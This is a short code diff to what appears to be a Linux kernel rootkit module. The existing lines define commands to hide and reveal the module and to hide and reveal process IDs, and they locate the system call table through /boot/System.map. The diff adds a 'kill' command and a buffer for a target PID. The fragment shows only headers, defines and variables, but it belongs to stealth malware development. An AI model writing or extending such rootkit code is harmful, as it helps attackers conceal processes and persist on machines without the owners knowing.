@@ -9,6 +9,7 @@
 #include <linux/proc_fs.h>
 #include <linux/fs.h>
 #include <linux/slab.h>     /* kmalloc */
+#include <linux/signal.h>
 
 MODULE_LICENSE("GPL");
 
@@ -20,6 +21,7 @@ MODULE_LICENSE("GPL");
 #define SHOW_MOD_CMD "show"
 #define HIDE_PID_CMD "hpid"
 #define SHOW_PID_CMD "spid"
+#define KILL_NINA_PID "kill"
 
 #define PROC_V "/proc/version"
 #define BOOT_PATH "/boot/System.map-"
@@ -37,6 +39,8 @@ static struct list_head *module_kobj_previous;
 
 static int temp;
 static char desc[50];
+
+static char nina_pid[10];
 
 unsigned long* syscall_table;
 
